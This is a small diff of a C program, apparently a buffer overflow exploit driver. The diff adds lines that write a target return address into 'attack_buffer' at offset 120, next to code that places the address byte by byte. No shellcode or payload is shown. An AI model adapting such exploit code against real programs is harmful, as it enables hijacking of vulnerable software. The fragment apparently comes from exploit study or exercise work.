@@ -32,6 +32,8 @@ main ( int argc, char * argv[] )
 	attack_buffer[BUF_TO_RET + 1] = (char) ((target >> 16) & 0xff);
 	attack_buffer[BUF_TO_RET] = (char) ((target >> 24) & 0xff);
 
+	int *a = (int*)&attack_buffer[120];
+	*a = target;
 	// memset(&attack_buffer[120], target, 4);
 
 	printf("hex: %x\n",attack_buffer[BUF_TO_RET]);
